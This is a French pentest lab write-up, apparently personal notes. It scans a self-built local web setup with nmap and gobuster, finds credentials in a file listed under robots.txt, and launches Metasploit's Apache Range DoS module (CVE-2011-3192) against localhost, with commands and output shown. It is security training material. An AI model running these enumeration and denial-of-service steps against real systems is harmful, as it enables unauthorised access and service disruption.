
![Maintenant que l'infrastructure est montée](Build_infra.md), on va mettre en place des scripts de pentest.


# Premiers scripts avec bash


Ayant plus de facilité et de rapidité avec un script *bash*, je vais essayer de les faire sur bash **vulnerability.sh** :

```bash
#!/bin/bash

sudo apt install nmap gobuster hping3

echo "[*] Scan de vulnérabilités sur http://localhost:8080"

echo "[+] Nmap vuln scan"
nmap -p 8080 --script vuln localhost

echo "[+] Gobuster - test de répertoires"
gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt

echo "[✓] Terminé"
```

Résultat en omettant la partie installation : 

![[Screen/resultat_script.png]]

* Ce qu'il faut retenir :
	* vulnérabilité CVE 2011 3192
	* Dossier index.html (rien d'interessant) 
	* Dossier robots.txt


##  Partie offensive (intéressante)

Mettant nous à la place d'un hackeur, le plus simple et de regarder le partie robots.txt

```bash
└─$ curl localhost/robots.txt
User-agent: *
Disallow: /admin-backup/
```

Si on essaye de regarder la page web :

![[Screen/admin-back.png]]

* On va donc essayer d'énumérer les dossiers : 

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://localhost/admin-backup -w /usr/share/wordlists/dirb/common.txt -x .txt,.php 

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://localhost/admin-backup
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/secret.txt           (Status: 200) [Size: 56]
Progress: 13842 / 13845 (99.98%)
===============================================================
Finished
===============================================================
```

On trouve secret.txt, on va donc le lire :

```bash
curl http://localhost/admin-backup/secret.txt
Admin access :
login : user14526
mdp : fae984ùvê5:;a;
```

Attaque réussie, on a obtenu le login et le mot de passe caché dans un dossier

## CVE 2011 3192 

Il a plusieurs moyens d'exploiter une CVE :
- Regarder ces infos sur CVE et faire un script
- Regarder s'il existe un exploit sur un outil  comme nmap / metasploit...

Tant qu'on est sur nmap, on va regarder s'il existe un script pour du DOS (Denial of Service) sur le load balancing d'un nginx (c'est la vulnérabilité de la CVE.)


```bash
nmap --script http-vuln-cve2011-3192.nse [--script-args http-vuln-cve2011-3192.hostname=nmap.scanme.org] -pT:8080 localhost
```

Pas convaincu...

Essayant avec metasploit

```bash
sudo apt install metasploit-framework
msfconsole
msf6 > search cve:CVE-2011-3192  

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/dos/http/apache_range_dos  2011-08-19       normal  No     Apache Range Header DoS (Apache Killer)
   1    \_ action: CHECK                   .                .       .      Check if target is vulnerable
   2    \_ action: DOS                     .                .       .      Trigger Denial of Service against target
```

Petit rappel : Un DOS (qui est l'attaque qu'on recherche) fait partie du module auxiliaire de msfconsole

Pour voir les options :

```bash
msf6 auxiliary(dos/http/apache_range_dos) > show options

Module options (auxiliary/dos/http/apache_range_dos):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   localhost        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RLIMIT   50               yes       Number of requests to send
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads (max one per host)
   URI      /                yes       The request URI
   VHOST                     no        HTTP server virtual host


Auxiliary action:

   Name  Description
   ----  -----------
   DOS   Trigger Denial of Service against target



View the full module info with the info, or info -d command.
```

Avec la commannde **`info`** on peut voir une option

```bash
Available actions:
    Name   Description
    ----   -----------
    CHECK  Check if target is vulnerable
=>  DOS    Trigger Denial of Service against target
```

Pour mettre les options et lancer l'attaque DOS classique (la flèche au dessus indique que c'est DOS qui est utilisée lorsqu'on fait run) :

```bash
use auxiliary/dos/http/apache_range_dos
set RHOSTS localhost
set RPORT 80
run
```

Résultat de l'attaque : 

![[wireshark_resultat_msf.png]]

Ce qu'il y a d'intéressant :
* Tout est en local, sur wireshark le raccourci ::1
* ça envoie en boucle des trames
* En noir la trame qui n'a pas été envoyée

```bash
msf6 auxiliary(dos/http/apache_range_dos) > check
[-] This module does not support check.
[*] Checked 1 of 2 hosts (050% complete)
[-] This module does not support check.
[*] Checked 2 of 2 hosts (100% complete)
```

En testant de refresh la page de localhost, on a quand même accès aux deux sites web, avec cependant avec beaucoup de latence...

On va essayer une injection SQL